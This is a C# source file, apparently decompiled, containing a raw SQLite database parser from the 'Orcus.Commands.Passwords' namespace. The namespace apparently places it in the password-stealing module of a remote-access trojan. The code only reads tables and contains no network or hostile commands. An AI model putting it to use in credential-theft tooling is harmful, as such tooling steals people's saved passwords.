using System;
using System.IO;
using System.Text;

namespace Orcus.Commands.Passwords.Utilities;

public class SQLiteHandler
{
	private struct record_header_field
	{
		public long size;

		public long type;
	}

	private struct sqlite_master_entry
	{
		public long row_id;

		public string item_type;

		public string item_name;

		public string astable_name;

		public long root_num;

		public string sql_statement;
	}

	private struct table_entry
	{
		public long row_id;

		public string[] content;
	}

	private readonly byte[] _dbBytes;

	private readonly ulong _encoding;

	private readonly ushort _pageSize;

	private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

	private string[] _fieldNames;

	private sqlite_master_entry[] _masterTableEntries;

	private table_entry[] _tableEntries;

	public SQLiteHandler(string baseName)
	{
		if (File.Exists(baseName))
		{
			using (FileStream fileStream = new FileStream(baseName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				_dbBytes = new byte[fileStream.Length];
				fileStream.Read(_dbBytes, 0, (int)fileStream.Length - 1);
			}
			if (string.Compare(Encoding.Default.GetString(_dbBytes, 0, 15), "SQLite format 3", StringComparison.Ordinal) != 0)
			{
				throw new Exception("Not a valid SQLite 3 Database File");
			}
			if (_dbBytes[52] != 0)
			{
				throw new Exception("Auto-vacuum capable database is not supported");
			}
			_pageSize = (ushort)ConvertToInteger(16, 2);
			_encoding = ConvertToInteger(56, 4);
			if (decimal.Compare(new decimal(_encoding), 0m) == 0)
			{
				_encoding = 1uL;
			}
			ReadMasterTable(100uL);
		}
	}

	private ulong ConvertToInteger(int startIndex, int size)
	{
		if (size > 8 || size == 0)
		{
			return 0uL;
		}
		ulong num = 0uL;
		int num2 = size - 1;
		for (int i = 0; i <= num2; i++)
		{
			num = (num << 8) | _dbBytes[startIndex + i];
		}
		return num;
	}

	private long CVL(int startIndex, int endIndex)
	{
		endIndex++;
		byte[] array = new byte[8];
		int num = endIndex - startIndex;
		bool flag = false;
		if (num == 0 || num > 9)
		{
			return 0L;
		}
		switch (num)
		{
		case 1:
			array[0] = (byte)(_dbBytes[startIndex] & 0x7Fu);
			return BitConverter.ToInt64(array, 0);
		case 9:
			flag = true;
			break;
		}
		int num2 = 1;
		int num3 = 7;
		int num4 = 0;
		if (flag)
		{
			array[0] = _dbBytes[endIndex - 1];
			endIndex--;
			num4 = 1;
		}
		for (int i = endIndex - 1; i >= startIndex; i += -1)
		{
			if (i - 1 >= startIndex)
			{
				array[num4] = (byte)(((byte)(_dbBytes[i] >> ((num2 - 1) & 7)) & (255 >> num2)) | (byte)(_dbBytes[i - 1] << (num3 & 7)));
				num2++;
				num4++;
				num3--;
			}
			else if (!flag)
			{
				array[num4] = (byte)((byte)(_dbBytes[i] >> ((num2 - 1) & 7)) & (255 >> num2));
			}
		}
		return BitConverter.ToInt64(array, 0);
	}

	public int GetRowCount()
	{
		return _tableEntries.Length;
	}

	public string[] GetTableNames()
	{
		string[] array = null;
		int num = 0;
		int num2 = _masterTableEntries.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (_masterTableEntries[i].item_type == "table")
			{
				array = (string[])CopyArray(array, new string[num + 1]);
				array[num] = _masterTableEntries[i].item_name;
				num++;
			}
		}
		return array;
	}

	public string GetValue(int rowNum, int field)
	{
		if (rowNum >= _tableEntries.Length)
		{
			return null;
		}
		if (field >= _tableEntries[rowNum].content.Length)
		{
			return null;
		}
		return _tableEntries[rowNum].content[field];
	}

	public string GetValue(int rowNum, string field)
	{
		int num = -1;
		int num2 = _fieldNames.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (_fieldNames[i].ToLower().CompareTo(field.ToLower()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return null;
		}
		return GetValue(rowNum, num);
	}

	private int GVL(int startIndex)
	{
		if (startIndex > _dbBytes.Length)
		{
			return 0;
		}
		int num = startIndex + 8;
		int num2 = startIndex;
		while (true)
		{
			if (num2 <= num)
			{
				if (num2 <= _dbBytes.Length - 1)
				{
					if ((_dbBytes[num2] & 0x80) != 128)
					{
						break;
					}
					num2++;
					continue;
				}
				return 0;
			}
			return startIndex + 8;
		}
		return num2;
	}

	private bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	private void ReadMasterTable(ulong offset)
	{
		if (_dbBytes[(uint)offset] == 13)
		{
			ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3m)), 2)), 1m));
			int num2 = 0;
			if (_masterTableEntries != null)
			{
				num2 = _masterTableEntries.Length;
				_masterTableEntries = (sqlite_master_entry[])CopyArray(_masterTableEntries, new sqlite_master_entry[_masterTableEntries.Length + num + 1]);
			}
			else
			{
				_masterTableEntries = new sqlite_master_entry[num + 1];
			}
			int num3 = num;
			for (int i = 0; i <= num3; i++)
			{
				ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8m), new decimal(i * 2))), 2);
				if (decimal.Compare(new decimal(offset), 100m) != 0)
				{
					num4 += offset;
				}
				int num5 = GVL((int)num4);
				CVL((int)num4, num5);
				int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
				_masterTableEntries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
				num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
				num5 = GVL((int)num4);
				num6 = num5;
				long value = CVL((int)num4, num5);
				long[] array = new long[5];
				int num7 = 0;
				do
				{
					num5 = num6 + 1;
					num6 = GVL(num5);
					array[num7] = CVL(num5, num6);
					if (array[num7] <= 9L)
					{
						array[num7] = _sqlDataTypeSize[(int)array[num7]];
					}
					else if (IsOdd(array[num7]))
					{
						array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
					}
					else
					{
						array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
					}
					num7++;
				}
				while (num7 <= 4);
				if (decimal.Compare(new decimal(_encoding), 1m) == 0)
				{
					_masterTableEntries[num2 + i].item_type = Encoding.Default.GetString(_dbBytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
				}
				else if (decimal.Compare(new decimal(_encoding), 2m) == 0)
				{
					_masterTableEntries[num2 + i].item_type = Encoding.Unicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
				}
				else if (decimal.Compare(new decimal(_encoding), 3m) == 0)
				{
					_masterTableEntries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
				}
				if (decimal.Compare(new decimal(_encoding), 1m) == 0)
				{
					_masterTableEntries[num2 + i].item_name = Encoding.Default.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
				}
				else if (decimal.Compare(new decimal(_encoding), 2m) == 0)
				{
					_masterTableEntries[num2 + i].item_name = Encoding.Unicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
				}
				else if (decimal.Compare(new decimal(_encoding), 3m) == 0)
				{
					_masterTableEntries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
				}
				_masterTableEntries[num2 + i].root_num = (long)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
				if (decimal.Compare(new decimal(_encoding), 1m) == 0)
				{
					_masterTableEntries[num2 + i].sql_statement = Encoding.Default.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
				else if (decimal.Compare(new decimal(_encoding), 2m) == 0)
				{
					_masterTableEntries[num2 + i].sql_statement = Encoding.Unicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
				else if (decimal.Compare(new decimal(_encoding), 3m) == 0)
				{
					_masterTableEntries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
			}
		}
		else if (_dbBytes[offset] == 5)
		{
			int num8 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3m)), 2)), 1m));
			for (int j = 0; j <= num8; j++)
			{
				ushort num9 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12m), new decimal(j * 2))), 2);
				ReadMasterTable((decimal.Compare(new decimal(offset), 100m) == 0) ? Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(num9, 4)), 1m), new decimal(_pageSize))) : Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(offset + num9), 4)), 1m), new decimal(_pageSize))));
			}
			ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8m)), 4)), 1m), new decimal(_pageSize))));
		}
	}

	public bool ReadTable(string tableName)
	{
		int num = -1;
		int num2 = _masterTableEntries.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (_masterTableEntries[i].item_name.ToLower().CompareTo(tableName.ToLower()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return false;
		}
		string[] array = _masterTableEntries[num].sql_statement.Substring(_masterTableEntries[num].sql_statement.IndexOf("(") + 1).Split(new char[1] { ',' });
		int num3 = array.Length - 1;
		for (int j = 0; j <= num3; j++)
		{
			array[j] = array[j].TrimStart(new char[0]);
			int num4 = array[j].IndexOf(" ");
			if (num4 > 0)
			{
				array[j] = array[j].Substring(0, num4);
			}
			if (array[j].IndexOf("UNIQUE") == 0)
			{
				break;
			}
			_fieldNames = (string[])CopyArray(_fieldNames, new string[j + 1]);
			_fieldNames[j] = array[j];
		}
		return ReadTableFromOffset((ulong)((_masterTableEntries[num].root_num - 1L) * _pageSize));
	}

	private bool ReadTableFromOffset(ulong offset)
	{
		if (_dbBytes[offset] == 13)
		{
			int num = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3m)), 2)), 1m));
			int num2 = 0;
			if (_tableEntries != null)
			{
				num2 = _tableEntries.Length;
				_tableEntries = (table_entry[])CopyArray(_tableEntries, new table_entry[_tableEntries.Length + num + 1]);
			}
			else
			{
				_tableEntries = new table_entry[num + 1];
			}
			int num3 = num;
			for (int i = 0; i <= num3; i++)
			{
				record_header_field[] array = null;
				ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8m), new decimal(i * 2))), 2);
				if (decimal.Compare(new decimal(offset), 100m) != 0)
				{
					num4 += offset;
				}
				int num5 = GVL((int)num4);
				CVL((int)num4, num5);
				int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
				_tableEntries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
				num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
				num5 = GVL((int)num4);
				num6 = num5;
				long num7 = CVL((int)num4, num5);
				long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
				int num9 = 0;
				while (num8 < num7)
				{
					array = (record_header_field[])CopyArray(array, new record_header_field[num9 + 1]);
					num5 = num6 + 1;
					num6 = GVL(num5);
					array[num9].type = CVL(num5, num6);
					if (array[num9].type > 9L)
					{
						if (IsOdd(array[num9].type))
						{
							array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
						}
						else
						{
							array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
						}
					}
					else
					{
						array[num9].size = _sqlDataTypeSize[array[num9].type];
					}
					num8 = num8 + (num6 - num5) + 1L;
					num9++;
				}
				_tableEntries[num2 + i].content = new string[array.Length - 1 + 1];
				int num10 = 0;
				int num11 = array.Length - 1;
				for (int j = 0; j <= num11; j++)
				{
					if (array[j].type > 9L)
					{
						if (!IsOdd(array[j].type))
						{
							if (decimal.Compare(new decimal(_encoding), 1m) == 0)
							{
								_tableEntries[num2 + i].content[j] = Encoding.Default.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
							}
							else if (decimal.Compare(new decimal(_encoding), 2m) == 0)
							{
								_tableEntries[num2 + i].content[j] = Encoding.Unicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
							}
							else if (decimal.Compare(new decimal(_encoding), 3m) == 0)
							{
								_tableEntries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
							}
						}
						else
						{
							_tableEntries[num2 + i].content[j] = Encoding.Default.GetString(_dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
						}
					}
					else
					{
						_tableEntries[num2 + i].content[j] = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size).ToString(null, null);
					}
					num10 += (int)array[j].size;
				}
			}
		}
		else if (_dbBytes[(uint)offset] == 5)
		{
			int num12 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3m)), 2)), 1m));
			for (int k = 0; k <= num12; k++)
			{
				ushort num13 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12m), new decimal(k * 2))), 2);
				ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(offset + num13), 4)), 1m), new decimal(_pageSize))));
			}
			ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8m)), 4)), 1m), new decimal(_pageSize))));
		}
		return true;
	}

	private static Array CopyArray(Array arySrc, Array aryDes)
	{
		if (arySrc == null)
		{
			return aryDes;
		}
		if (aryDes == null)
		{
			return arySrc;
		}
		Array.Copy(arySrc, aryDes, arySrc.Length);
		return aryDes;
	}
}
